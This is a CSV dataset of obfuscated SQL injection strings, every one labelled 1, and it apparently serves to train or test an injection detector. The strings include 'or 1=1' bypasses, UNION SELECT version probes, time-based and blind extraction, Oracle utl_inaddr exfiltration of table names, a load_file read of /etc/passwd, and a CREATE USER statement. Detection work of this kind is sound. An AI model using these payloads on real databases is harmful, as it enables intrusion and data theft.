Query,Label
""" or pg_sleep  (  __TIME__  )  --",1
c%%r%%ea%t%e user name identified b%y pass123 tempo%%rary t%ab%lespace temp default t%ab%lespace users;,1
" %and 1  =  utl_i%naddr.get_host_address   (    (   %%s%%el%ec%t DisTi%nCT  (  tab%l%%e_name  )   %f%r%%o%m   (  %%s%%el%ec%t DisTi%nCT  (  tab%l%%e_name  )  , ROWNUM AS %%l%im%%it %f%r%%o%m sys.all_tab%l%%es  )   %w%here %%l%im%%it  =  5   )    )    %and 'i'  =  'i",1
" s%%e%l%%ec%%t * %f%%r%%om users %%wh%er%e id  =  '1' o%%r @ @1  =  1 union s%%e%l%%ec%%t 1,version  (    )   -- 1'",1
" %%s%e%le%%c%t * %fr%%o%m users %wh%e%%r%e id  =  1 or 1#""  (   union %%s%e%le%%c%t 1,version  (    )   -- 1",1
 %%s%%e%%l%e%c%%t name %%f%rom syscolumns %%wh%e%r%%e id   =     (  %%s%%e%%l%e%c%%t id %%f%rom sysobjects %%wh%e%r%%e name   =   %t%a%b%l%%ename'  )  --,1
%%s%%elect * %f%%r%om users %%whe%re id  =  1 +$+ %or 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" s%%e%l%%e%%ct * %from users w%he%r%%e id  =  '1' %or ||/1  =  1 union s%%e%l%%e%%ct 1,version  (    )   -- 1'",1
" s%e%le%%ct * %%f%ro%m users %w%h%e%re id  =  '1' %%o%%r \.<\ union s%e%le%%ct 1,@@VERSION -- 1'",1
? %o%%r 1  =  1 --,1
 )   %or   (  'a'  =  'a,1
adm%%i%n' %o%r 1  =  1#,1
" %%s%el%e%ct * %%fro%%m users %%w%he%%r%%e id  =  1 %%o%%r ""  (  ]"" %%o%%r 1  =  1 -- 1",1
%%or 1  =  1 --,1
" an%%d 1  =  utl_%%i%%naddr.get_host_address   (    (   %sel%e%c%%t D%%i%%sT%%i%%nCT  (  column_name  )   %f%%r%%o%m   (  %sel%e%c%%t D%%i%%sT%%i%%nCT  (  column_name  )  , ROWNUM AS lim%i%t %f%%r%%o%m all_tab_columns  )   %%w%h%e%re lim%i%t  =  5   )    )    an%%d 'i'  =  'i",1
" %%s%e%le%%ct * f%r%om users w%%h%%e%r%e id  =  '1' %!<@ union %%s%e%le%%ct 1,version  (    )   -- 1'",1
" %s%%ele%c%%t * f%r%%om users %w%h%e%r%e id  =  1 o%%r ""&  (  "" o%%r 1  =  1 -- 1",1
" s%%el%ect * %f%%ro%m users %w%%he%re id  =  1 %%or ""?  (  "" %%or 1  =  1 -- 1",1
disti%nct,1
%se%le%c%%t * fr%%o%%m users wh%%e%%r%e id  =  '1' *  (  \  )   %o%r 1  =  1 -- 1',1
"1 %%a%nd ascii  (  lower  (  substri%%ng   (    (   %%s%e%%l%%e%ct top 1 name %%f%rom sysobjects %w%h%%er%e xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
sel%e%%c%%t * %%f%%r%o%%m users %%where id  =  1 %or \.<\ %or 1  =  1 -- 1,1
"admin"" %o%%r ""1""  =  ""1""--",1
" %%se%l%%e%%ct * %%f%%rom users %%wh%ere id  =  1 or ""%{"" or 1  =  1 -- 1",1
%%i%%ns%e%%rt,1
" s%%e%l%e%c%%t * %f%%rom users %wh%%er%%e id  =  1 %%o%r 1#""?  =  1 %%o%r 1  =  1 -- 1",1
" %%s%e%le%%c%%t * %f%r%o%%m users w%h%e%r%e id  =  1 %o%r ""%?"" %o%r 1  =  1 -- 1",1
